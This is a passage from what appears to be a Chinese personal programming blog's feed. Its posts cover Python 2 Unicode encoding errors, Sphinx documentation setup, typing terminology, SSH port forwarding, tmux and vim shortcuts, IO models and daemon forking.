&lt;p&gt;Python2中有两种字符串类型。分别是&lt;code&gt;str&lt;/code&gt;和&lt;code&gt;unicode&lt;/code&gt;。（Py3已经统一成unicode)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;str&lt;/code&gt; 是由bytes组成的sequence，&lt;code&gt;unicode&lt;/code&gt;是Unicode字符集组成的sequence。&lt;/p&gt;
&lt;p&gt;string里的有多种编码方式，比如最常用的ascii和utf-8。想解读string，必需知道string里的character是用哪种编码方式，然后才能进行。&lt;/p&gt;
&lt;p&gt;unicode有一个&lt;code&gt;.encode()&lt;/code&gt;方法去产生byte strings。bytes strings 有对应的.decode()的方法去生成unicode strings.&lt;/p&gt;
&lt;p&gt;牢记一句话：&lt;strong&gt; ascii和utf-8是编解码方式，unicode是字符集。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;为什么会出现unicode字符集呢？ascii码不够用。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;In [8]: a=&amp;quot;你好&amp;quot; # Mac下面中文默认为utf-8编码

In [9]: a
Out[9]: &amp;#39;\xe4\xbd\xa0\xe5\xa5\xbd&amp;#39;

In [10]: a.decode(&amp;quot;utf-8&amp;quot;)
Out[10]: u&amp;#39;\u4f60\u597d&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;复现&lt;code&gt;UnicodeEncodeError encode&lt;/code&gt;错误&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;In [11]: b=u&amp;quot;你好&amp;quot;

In [12]: b
Out[12]: u&amp;#39;\u4f60\u597d&amp;#39;

In [13]: &amp;quot;abc{}&amp;quot;.format(b)
---------------------------------------------------------------------------
UnicodeEncodeError                        Traceback (most recent call last)
&amp;lt;ipython-input-13-19e1bc96cb52&amp;gt; in &amp;lt;module&amp;gt;()
----&amp;gt; 1 &amp;quot;abc{}&amp;quot;.format(b)

UnicodeEncodeError: &amp;#39;ascii&amp;#39; codec can&amp;#39;t encode characters in position 0-1: ordinal not in range(128)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;上面因为Python默认用ascii对unicode b字符串进行编码了。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getdefaultencoding&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;# py2默认编码方式是ascii&lt;/span&gt;
&lt;span class="n"&gt;Out&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;避免encode错误，需要我们手动指定编码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;In [17]: &amp;quot;abc{}&amp;quot;.format(b.encode(&amp;quot;utf-8&amp;quot;))
Out[17]: &amp;#39;abc\xe4\xbd\xa0\xe5\xa5\xbd&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;复现&lt;code&gt;UnicodeDecodeError decode&lt;/code&gt;错误&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;In [18]: u&amp;quot;abc{}&amp;quot;.format(a)
---------------------------------------------------------------------------
UnicodeDecodeError                        Traceback (most recent call last)
&amp;lt;ipython-input-18-8f4837b78059&amp;gt; in &amp;lt;module&amp;gt;()
----&amp;gt; 1 u&amp;quot;abc{}&amp;quot;.format(a)

UnicodeDecodeError: &amp;#39;ascii&amp;#39; codec can&amp;#39;t decode byte 0xe4 in position 0: ordinal not in range(128)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这种情况也是需要我们手动指定解码方式:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;In [19]: u&amp;quot;abc{}&amp;quot;.format(a.decode(&amp;quot;utf-8&amp;quot;))
Out[19]: u&amp;#39;abc\u4f60\u597d&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;使用 sys.setdefaultencoding("utf-8") 解决：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;In [20]: reload(sys)
&amp;lt;module &amp;#39;sys&amp;#39; (built-in)&amp;gt;

In [21]: sys.setdefaultencoding(&amp;quot;utf-8&amp;quot;)

In [22]: t1=&amp;quot;中国&amp;quot;

In [23]: t1
&amp;#39;\xe4\xb8\xad\xe5\x9b\xbd&amp;#39;

In [24]: u&amp;quot;abc{}&amp;quot;.format(t1)
u&amp;#39;abc\u4e2d\u56fd&amp;#39;

In [25]: t2=u&amp;quot;中国&amp;quot;

In [26]: &amp;quot;abc{}&amp;quot;.format(t2)
&amp;#39;abc\xe4\xb8\xad\xe5\x9b\xbd&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;总结&lt;/h3&gt;
&lt;p&gt;1， UnicodeEncodeError错误，发生在Unicode转换成bytes流的时候出错，需要我们手动指定encode。 &lt;br&gt;
2， UnicodeDecodeError错误，发生在bytes流转换成unicode时发生错误，需要我们手动指定decode  &lt;br&gt;
3， ascii和utf-8是编解码方式，unicode是字符集，ascii是utf-8的子集。&lt;/p&gt;
&lt;p&gt;推荐:
&lt;a href="http://nedbatchelder.com/text/unipain.html"&gt;http://nedbatchelder.com/text/unipain.html&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>Python文档工具</title><link href="https://lovedboy.github.io/blog/1970/01/01/pythonwen-dang-gong-ju.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/pythonwen-dang-gong-ju.html</id><summary type="html">&lt;p&gt;程序员最讨厌的两件事情：给项目写文档和接手的项目没有文档。&lt;/p&gt;
&lt;p&gt;介绍一个文档生成工具。&lt;a href="http://sphinx-doc.org/"&gt;sphinx&lt;/a&gt;，据说Python的官方文档就是这货生成的。&lt;/p&gt;
&lt;p&gt;但不是markdown语法写作不开心啊，你需要&lt;a href="https://github.com/jgm/pandoc"&gt;pandoc&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;一个小伙伴发我的步骤：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;1.==&amp;gt;To run doc, packages following should be installed:

apt-get install pandoc
apt-get install python-sphinx

2.==&amp;gt;How can we use it?

(1) mkdir doc &amp;amp;&amp;amp; cd doc

(2)Run command: sphinx-quickstart

(3)After configuration:

You should now populate your master file ./source …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;程序员最讨厌的两件事情：给项目写文档和接手的项目没有文档。&lt;/p&gt;
&lt;p&gt;介绍一个文档生成工具。&lt;a href="http://sphinx-doc.org/"&gt;sphinx&lt;/a&gt;，据说Python的官方文档就是这货生成的。&lt;/p&gt;
&lt;p&gt;但不是markdown语法写作不开心啊，你需要&lt;a href="https://github.com/jgm/pandoc"&gt;pandoc&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;一个小伙伴发我的步骤：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;1.==&amp;gt;To run doc, packages following should be installed:

apt-get install pandoc
apt-get install python-sphinx

2.==&amp;gt;How can we use it?

(1) mkdir doc &amp;amp;&amp;amp; cd doc

(2)Run command: sphinx-quickstart

(3)After configuration:

You should now populate your master file ./source/index.rst and create other documentation
source files. Use the Makefile to build the docs, like so:
   make builder
where &amp;quot;builder&amp;quot; is one of the supported builders, e.g. html, latex or linkcheck.

3.==&amp;gt;For the detail, checkout the link

http://sphinx-doc.org/latest/tutorial.html

4.==&amp;gt;Write doc

(1)Write your document with markdown syntax in directory source, such as

xx.md
yy.md

(2)Add content in file index.rst
xx
yy

5.==&amp;gt;Make doc

Run the following command:

bash run_doc.sh

6.==&amp;gt;Visit document

(1)add configure in nginx

     location /doc/ {
         alias path/doc/build/html/;
     }

(2)visit document

   http://yourdomain/doc/index.html


7.markdown editor

http://mahua.jser.me
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;run_doc.sh 脚本:&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nv"&gt;files&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;./source/*.md

&lt;span class="k"&gt;for&lt;/span&gt; file in &lt;span class="nv"&gt;$files&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt;
    pandoc &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$file&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; -o &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;file&lt;/span&gt;&lt;span class="p"&gt;%.md&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;.rst&amp;quot;&lt;/span&gt; 
&lt;span class="k"&gt;done&lt;/span&gt;

make html
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;如果需要限制文档匿名访问。可以在alias上面加上这两行：&lt;a href="http://nginx.org/en/docs/http/ngx_http_auth_basic_module.html"&gt;参考&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; auth_basic &amp;quot;WTF,PASSWORD?&amp;quot;;
 auth_basic_user_file conf/htpasswd;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如何生成password，你可以下载&lt;a href="https://gist.github.com/lovedboy/ae4e1e7432d41cb6e712"&gt;nginx_auth.py&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;python nginx_auth.py username password &amp;gt;&amp;gt; conf/htpasswd
&lt;/pre&gt;&lt;/div&gt;</content></entry><entry><title>弱类型、强类型、动态类型、静态类型</title><link href="https://lovedboy.github.io/blog/1970/01/01/ruo-lei-xing-qiang-lei-xing-dong-tai-lei-xing-jing-tai-lei-xing.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/ruo-lei-xing-qiang-lei-xing-dong-tai-lei-xing-jing-tai-lei-xing.html</id><summary type="html">&lt;h3&gt;弱类型&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A language in which types may be ignored; the opposite of strongly typed. VBScript is weakly typed. In VBScript, you can concatenate the string '12' and the integer 3 to get the string '123', then treat that as the integer 123, all without any explicit conversion.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;强类型&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A language …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;h3&gt;弱类型&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A language in which types may be ignored; the opposite of strongly typed. VBScript is weakly typed. In VBScript, you can concatenate the string '12' and the integer 3 to get the string '123', then treat that as the integer 123, all without any explicit conversion.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;强类型&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A language in which types are always enforced. Java and Python are strongly typed. If you have an integer, you can't treat it like a string without explicitly converting it. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;动态类型&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A language in which types are discovered at execution time; the opposite of statically typed. VBScript and Python are dynamically typed, because they figure out what type a variable is when you first assign it a value. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;静态类型&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;A language in which types are fixed at compile time. Most statically typed languages enforce this by requiring you to declare all variables with their datatypes before using them. Java and C are statically typed languages. &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href="http://www.zhihu.com/people/zord-vczh"&gt;vczh&lt;/a&gt; 总结了一个简短的:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;强类型：偏向于不容忍隐式类型转换。譬如说haskell的int就不能变成double&lt;/li&gt;
&lt;li&gt;弱类型：偏向于容忍隐式类型转换。譬如说C语言的int可以变成double&lt;/li&gt;
&lt;li&gt;静态类型：编译的时候就知道每一个变量的类型，因为类型错误而不能做的事情是语法错误。&lt;/li&gt;
&lt;li&gt;动态类型：编译的时候不知道每一个变量的类型，因为类型错误而不能做的事情是运行时错误。譬如说你不能对一个数字a写a[10]当数组用。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;很多人说JavaScript坑，原因可能就是它既是动态类型又是弱类型的语言吧。  &lt;/p&gt;
&lt;p&gt;写了两三年动态语言（Python），越发喜欢强类型+静态语言+类型推倒的语言，比如swift和rust。&lt;/p&gt;
&lt;p&gt;知乎上就有人吐糟：动态类型一时爽，代码重构火葬场。&lt;/p&gt;
&lt;p&gt;到了代码上万行、多人协作的时候就真的深深体会到了。&lt;/p&gt;</content></entry><entry><title>ssh</title><link href="https://lovedboy.github.io/blog/1970/01/01/ssh.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/ssh.html</id><summary type="html">&lt;h3&gt;绑定本地端口(翻墙)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ssh -D 12345 user@host&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;SSH会建立一个socket，去监听本地的12345端口。一旦有数据传向那个端口，就自动把它转移到SSH连接上面，发往远程主机。&lt;/p&gt;
&lt;p&gt;配合SwitchySharp翻墙不能更爽。&lt;/p&gt;
&lt;p&gt;一般用下面的命令启动：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -f -NT -D 12345 user@host&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;N参数，表示只连接远程主机，不打开远程shell；&lt;/p&gt;
&lt;p&gt;T参数，表示不为这个连接分配TTY&lt;/p&gt;
&lt;p&gt;f参数，表示成功后放入后台执行。&lt;/p&gt;
&lt;h3&gt;端口转发&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ssh -L 33060:host1:3306 host2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;命令中的L参数一共接受三个值，分别是"本地端口:目标主机:目标主机端口"，用冒号分隔。&lt;/p&gt;
&lt;p&gt;这条命令的意思，就是指定SSH绑定本地端口33060，然后指定host2将所有的数据，转发到目标主机host1的3306端口。&lt;/p&gt;
&lt;p&gt;配合navicat管理远程mysql服务很方便。&lt;/p&gt;
&lt;p&gt;ssh 还有一个-R参数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -R …&lt;/code&gt;&lt;/p&gt;</summary><content type="html">&lt;h3&gt;绑定本地端口(翻墙)&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ssh -D 12345 user@host&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;SSH会建立一个socket，去监听本地的12345端口。一旦有数据传向那个端口，就自动把它转移到SSH连接上面，发往远程主机。&lt;/p&gt;
&lt;p&gt;配合SwitchySharp翻墙不能更爽。&lt;/p&gt;
&lt;p&gt;一般用下面的命令启动：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -f -NT -D 12345 user@host&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;N参数，表示只连接远程主机，不打开远程shell；&lt;/p&gt;
&lt;p&gt;T参数，表示不为这个连接分配TTY&lt;/p&gt;
&lt;p&gt;f参数，表示成功后放入后台执行。&lt;/p&gt;
&lt;h3&gt;端口转发&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ssh -L 33060:host1:3306 host2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;命令中的L参数一共接受三个值，分别是"本地端口:目标主机:目标主机端口"，用冒号分隔。&lt;/p&gt;
&lt;p&gt;这条命令的意思，就是指定SSH绑定本地端口33060，然后指定host2将所有的数据，转发到目标主机host1的3306端口。&lt;/p&gt;
&lt;p&gt;配合navicat管理远程mysql服务很方便。&lt;/p&gt;
&lt;p&gt;ssh 还有一个-R参数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh -R 2121:host2:21 host1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;R参数也是接受三个值，分别是"远程主机端口:目标主机:目标主机端口"。&lt;/p&gt;
&lt;p&gt;这条命令的意思是，开启远程host1上的2121端口,将host1上2121端口的数据转发到host2上的21端口。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href="http://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html"&gt;http://www.ruanyifeng.com/blog/2011/12/ssh_port_forwarding.html&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>tmux快捷键</title><link href="https://lovedboy.github.io/blog/1970/01/01/tmuxkuai-jie-jian.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/tmuxkuai-jie-jian.html</id><summary type="html">&lt;h3&gt;复制粘贴&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;[ 进入复制模式。&lt;/li&gt;
&lt;li&gt;] 粘贴&lt;/li&gt;
&lt;li&gt;进入复制模式后，可以用vi风格的快捷键进行移动（按上文的设置）。按下sapce就可以选择文本。回车键进行复制。然后再通过]进行粘贴。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;session操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;d deattch当前session。输入tmux attach [-t sessionname]重新进入该session。&lt;/li&gt;
&lt;li&gt;tmux ls 列出所有session。退出当前session后，tmux attach -t 1即可切换到名字为1的session。&lt;/li&gt;
&lt;li&gt;$ 重命名当前session&lt;/li&gt;
&lt;li&gt;&lt;c-z&gt; 挂起当前session&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;window操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;c 创建一个新的window&lt;/li&gt;
&lt;li&gt;b 重命名当前window&lt;/li&gt;
&lt;li&gt;&amp;amp; 关闭当前window&lt;/li&gt;
&lt;li&gt;n 移动到下一个窗口&lt;/li&gt;
&lt;li&gt;p 移动到前一个窗口&lt;/li&gt;
&lt;li&gt;l 切换到上一个窗口&lt;/li&gt;
&lt;li&gt;w 列出所有窗口编号,并进行选择切换&lt;/li&gt;
&lt;li&gt;. 修改窗口编号，相当于排序。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;pane操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;" 横向分割&lt;/li&gt;
&lt;li&gt;% 纵向分割&lt;/li&gt;
&lt;li&gt;方向键 在pane直接移动 …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h3&gt;复制粘贴&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;[ 进入复制模式。&lt;/li&gt;
&lt;li&gt;] 粘贴&lt;/li&gt;
&lt;li&gt;进入复制模式后，可以用vi风格的快捷键进行移动（按上文的设置）。按下sapce就可以选择文本。回车键进行复制。然后再通过]进行粘贴。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;session操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;d deattch当前session。输入tmux attach [-t sessionname]重新进入该session。&lt;/li&gt;
&lt;li&gt;tmux ls 列出所有session。退出当前session后，tmux attach -t 1即可切换到名字为1的session。&lt;/li&gt;
&lt;li&gt;$ 重命名当前session&lt;/li&gt;
&lt;li&gt;&lt;c-z&gt; 挂起当前session&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;window操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;c 创建一个新的window&lt;/li&gt;
&lt;li&gt;b 重命名当前window&lt;/li&gt;
&lt;li&gt;&amp;amp; 关闭当前window&lt;/li&gt;
&lt;li&gt;n 移动到下一个窗口&lt;/li&gt;
&lt;li&gt;p 移动到前一个窗口&lt;/li&gt;
&lt;li&gt;l 切换到上一个窗口&lt;/li&gt;
&lt;li&gt;w 列出所有窗口编号,并进行选择切换&lt;/li&gt;
&lt;li&gt;. 修改窗口编号，相当于排序。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;pane操作&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;" 横向分割&lt;/li&gt;
&lt;li&gt;% 纵向分割&lt;/li&gt;
&lt;li&gt;方向键 在pane直接移动&lt;/li&gt;
&lt;li&gt;o 到下一个pane&lt;/li&gt;
&lt;li&gt;opt+方向键 调整pane大小&lt;/li&gt;
&lt;li&gt;{ / }左右pane交换&lt;/li&gt;
&lt;li&gt;空格 横竖切换&lt;/li&gt;
&lt;li&gt;q 显示pane的编号&lt;/li&gt;
&lt;li&gt;x 关闭当前pane&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我的.tmux.conf配置文件&lt;a href="https://gist.github.com/lovedboy/6c7a07acf7778e38914d"&gt;https://gist.github.com/lovedboy/6c7a07acf7778e38914d&lt;/a&gt;.&lt;/p&gt;</content></entry><entry><title>同步IO、异步IO、阻塞、非阻塞</title><link href="https://lovedboy.github.io/blog/1970/01/01/tong-bu-io-yi-bu-io-zu-sai-fei-zu-sai.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/tong-bu-io-yi-bu-io-zu-sai-fei-zu-sai.html</id><summary type="html">&lt;p&gt;转&lt;a href="http://www.zhihu.com/question/19732473"&gt;@陈硕&lt;/a&gt; 在知乎上的回答。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在处理 IO 的时候，阻塞和非阻塞都是同步 IO。&lt;/p&gt;
&lt;p&gt;只有使用了特殊的 API 才是异步 IO。&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://ww3.sinaimg.cn/large/79565610gw1ew5mffiugkj20bj04674h.jpg"&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;具体可参看《Unix环境高级编程》。&lt;/p&gt;</summary><content type="html">&lt;p&gt;转&lt;a href="http://www.zhihu.com/question/19732473"&gt;@陈硕&lt;/a&gt; 在知乎上的回答。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在处理 IO 的时候，阻塞和非阻塞都是同步 IO。&lt;/p&gt;
&lt;p&gt;只有使用了特殊的 API 才是异步 IO。&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://ww3.sinaimg.cn/large/79565610gw1ew5mffiugkj20bj04674h.jpg"&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;具体可参看《Unix环境高级编程》。&lt;/p&gt;</content></entry><entry><title>vim快捷键</title><link href="https://lovedboy.github.io/blog/1970/01/01/vimkuai-jie-jian.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/vimkuai-jie-jian.html</id><summary type="html">&lt;p&gt;收藏这张图就可以了。&lt;a href="http://roclinux.cn/?p=1836"&gt;来源&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="http://ww3.sinaimg.cn/large/79565610gw1euhjf9g0ehj20sg0k3dor.jpg" src="http://ww3.sinaimg.cn/large/79565610gw1euhjf9g0ehj20sg0k3dor.jpg"&gt;&lt;/p&gt;
&lt;p&gt;另外可以参看&lt;a href="http://coolshell.cn/articles/5426.html"&gt;左耳朵耗子的这篇文章&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;其他的tips：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:10,100&amp;gt;&lt;/code&gt; 第10行至第100行缩进&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:20,80&amp;lt;&lt;/code&gt;  第20行至第80行反缩进&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl + v&lt;/code&gt; 进入块选择模式，然后移动光标选中你要注释的行，再按大写的&lt;code&gt;I&lt;/code&gt;进入行首插入模式输入注释符号,如 // 或 #&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl + v&lt;/code&gt; 进入块选择模式，选中你要删除的行首的注释符号，注意// 要选中两个，选好之后按d即可删除注释&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gg=G&lt;/code&gt; 代码自动缩进 &lt;a href="http://lizhuang.iteye.com/blog/1067262"&gt;more&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[addr]s/源字符串/目的字符串/[option]&lt;/code&gt; 全局替换命令为：:%s/源字符串/目的字符串/g, [addr] 表示检索范围，省略时表示当前行。如：“1,20” ：表示从第1行到20行&lt;/li&gt;
&lt;/ul&gt;</summary><content type="html">&lt;p&gt;收藏这张图就可以了。&lt;a href="http://roclinux.cn/?p=1836"&gt;来源&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="http://ww3.sinaimg.cn/large/79565610gw1euhjf9g0ehj20sg0k3dor.jpg" src="http://ww3.sinaimg.cn/large/79565610gw1euhjf9g0ehj20sg0k3dor.jpg"&gt;&lt;/p&gt;
&lt;p&gt;另外可以参看&lt;a href="http://coolshell.cn/articles/5426.html"&gt;左耳朵耗子的这篇文章&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;其他的tips：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;:10,100&amp;gt;&lt;/code&gt; 第10行至第100行缩进&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:20,80&amp;lt;&lt;/code&gt;  第20行至第80行反缩进&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl + v&lt;/code&gt; 进入块选择模式，然后移动光标选中你要注释的行，再按大写的&lt;code&gt;I&lt;/code&gt;进入行首插入模式输入注释符号,如 // 或 #&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl + v&lt;/code&gt; 进入块选择模式，选中你要删除的行首的注释符号，注意// 要选中两个，选好之后按d即可删除注释&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gg=G&lt;/code&gt; 代码自动缩进 &lt;a href="http://lizhuang.iteye.com/blog/1067262"&gt;more&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;:[addr]s/源字符串/目的字符串/[option]&lt;/code&gt; 全局替换命令为：:%s/源字符串/目的字符串/g, [addr] 表示检索范围，省略时表示当前行。如：“1,20” ：表示从第1行到20行&lt;/li&gt;
&lt;/ul&gt;</content></entry><entry><title>为什么daemon进程fork两次</title><link href="https://lovedboy.github.io/blog/1970/01/01/wei-shi-yao-daemonjin-cheng-forkliang-ci.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/wei-shi-yao-daemonjin-cheng-forkliang-ci.html</id><summary type="html">&lt;h1&gt;为什么daemon进程fork两次&lt;/h1&gt;
&lt;p&gt;写daemon进程的一版方式为：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pid = os.fork()
if pid &amp;gt; 0:
    exit(0)
os.setsid()
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;但看网上很多有fork两次的写法：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pid = os.fork()
if pid &amp;gt; 0:
    exit(0)
os.setsid()
pid = os.fork()
if pid &amp;gt; 0:
    exit(0)
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我感觉是没必要，第一次fork后，父进程退出了，子进程已经托管给init进程，然后调用setsid成为会话首进程，就已经是daemon进程了。为什么还要调用第二次fork？&lt;/p&gt;
&lt;p&gt;看stackoverflow上的&lt;a href="http://stackoverflow.com/questions/881388/what-is-the-reason-for-performing-a-double-fork-when-creating-a-daemon"&gt;讨论&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
